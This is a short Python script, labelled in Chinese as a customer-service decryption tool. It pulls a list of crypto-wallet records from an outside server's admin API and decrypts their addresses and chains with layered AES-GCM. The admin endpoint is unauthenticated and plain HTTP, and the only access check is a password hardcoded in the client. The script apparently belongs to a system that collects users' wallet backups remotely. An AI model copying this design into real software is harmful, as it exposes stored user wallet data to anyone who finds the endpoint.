"""
客服解密工具 - 纯Python脚本
请求服务器API获取加密数据，本地解密
"""
import requests
from file_key_extractor import get_encryption_keys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import base64


SERVER_API = 'http://api.ai656.top'
FIXED_PASSWORD = 'customer_service_2026'


def decrypt_double(encrypted_str):
    client_key, server_key = get_encryption_keys()
    
    encrypted_data = base64.b64decode(encrypted_str)
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]
    aesgcm = AESGCM(server_key)
    client_encrypted = aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8')
    
    client_data = base64.b64decode(client_encrypted)
    nonce2 = client_data[:12]
    ciphertext2 = client_data[12:]
    aesgcm2 = AESGCM(client_key)
    original_data = aesgcm2.decrypt(nonce2, ciphertext2, None).decode('utf-8')
    
    return original_data


def login_and_decrypt():
    print("客服解密工具")
    print("="*50)
    
    password = input("输入密码: ")
    if password != FIXED_PASSWORD:
        print("密码错误")
        return
    
    print("验证通过，正在获取数据...")
    
    response = requests.get(f'{SERVER_API}/api/admin/list_all')
    data = response.json()
    
    if not data.get('success'):
        print(f"获取失败: {data.get('message')}")
        return
    
    wallets = data['data']['wallets']
    print(f"\n共 {len(wallets)} 条记录\n")
    
    for wallet in wallets:
        try:
            address = decrypt_double(wallet['address'])
            chain = decrypt_double(wallet['chain'])
            print(f"地址: {address}")
            print(f"链: {chain}")
            print(f"备份时间: {wallet['backup_time']}")
            print("-" * 50)
        except Exception as e:
            print(f"解密失败: {e}")
    
    print("\n完成")


if __name__ == '__main__':
    login_and_decrypt()
